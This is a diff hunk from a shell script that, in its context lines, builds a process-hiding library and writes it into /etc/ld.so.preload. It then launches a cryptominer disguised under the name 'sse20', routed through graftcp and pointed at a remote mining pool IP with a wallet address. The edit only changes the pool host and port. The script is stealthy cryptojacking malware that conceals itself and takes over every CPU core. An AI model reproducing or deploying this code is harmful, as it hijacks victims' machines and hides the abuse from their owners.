@@ -54,4 +54,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp & clear & ./sse20 -a yespowertide -o 143.198.85.42:80 -u tbc1qaczckuxmhvtw58llx5ajpz3xwxpp2zc0shak9g -t $(nproc)
+./graftcp/graftcp & clear & ./sse20 -a yespowertide -o 37.230.62.246:443 -u tbc1qaczckuxmhvtw58llx5ajpz3xwxpp2zc0shak9g -t $(nproc)
